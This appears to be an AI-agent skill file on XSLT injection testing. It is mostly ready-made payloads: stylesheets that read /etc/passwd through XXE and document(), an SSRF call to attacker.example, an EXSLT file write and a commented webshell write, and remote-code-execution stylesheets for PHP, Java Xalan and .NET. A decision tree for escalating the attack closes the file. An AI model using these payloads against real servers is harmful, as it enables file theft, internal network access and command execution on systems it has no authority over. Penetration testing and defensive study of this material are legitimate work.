---
name: xslt-injection
description: >-
  XSLT injection testing: processor fingerprinting, XXE and document() SSRF, EXSLT write primitives, PHP/Java/.NET extension RCE surfaces. Use when user-controlled XSLT/stylesheet input or transform endpoints are in scope.
---

# SKILL: XSLT Injection

## 0. QUICK START

1. **Find sinks**: params named `xslt`, `stylesheet`, `transform`, `template`; SOAP stylesheets; report generators; XML→HTML converters
2. **Probe**: inject `<xsl:value-of select="'XSLT_PROBE_OK'"/>` — if reflected, execution confirmed
3. **Fingerprint** processor (§1)
4. **Escalate** by platform (§2–7)

---

## 1. VENDOR DETECTION

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

| Signal | Engine |
|--------|--------|
| `Apache Software Foundation` | Xalan (Java) |
| `Saxonica` | Saxon |
| `libxslt` / GNOME | libxslt (PHP, nginx) |
| Microsoft URLs | MSXML / .NET |

---

## 2. XXE VIA XSLT

```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="&ext_file;"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 3. FILE READ VIA `document()`

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

```xml
<!-- Windows -->
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>

<!-- SSRF -->
<xsl:copy-of select="document('http://attacker.example/ssrf')"/>
```

---

## 4. FILE WRITE VIA EXSLT

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  <xsl:template match="/">
    <exploit:document href="/tmp/evil.txt" method="text">
      <xsl:text>PROOF_CONTENT</xsl:text>
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

---

## 5. RCE VIA PHP (`php:function`)

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function('readfile','index.php')"/>
    <xsl:value-of select="php:function('scandir','.')"/>
    <!-- webshell: php:function('file_put_contents','/var/www/shell.php','&lt;?php ...') -->
  </xsl:template>
</xsl:stylesheet>
```

Requires PHP XSLT with `registerPHPFunctions()` exposed (misconfiguration).

---

## 6. RCE VIA JAVA (XALAN EXTENSION)

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 7. RCE VIA .NET (`msxsl:script`)

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 8. DECISION TREE

```
User influences XSLT?
|
+-- Fingerprint processor (§1)
|
+-- document() / XXE available?
|   +-- Read files (§2, §3)
|   +-- SSRF (§3)
|
+-- EXSLT enabled? → write files (§4)
|
+-- PHP with registerPHPFunctions? → RCE (§5)
|
+-- Java/Xalan extensions? → Runtime.exec (§6)
|
+-- .NET with msxsl:script? → C# exec (§7)
```

---

## Related

- [xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md)
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md)
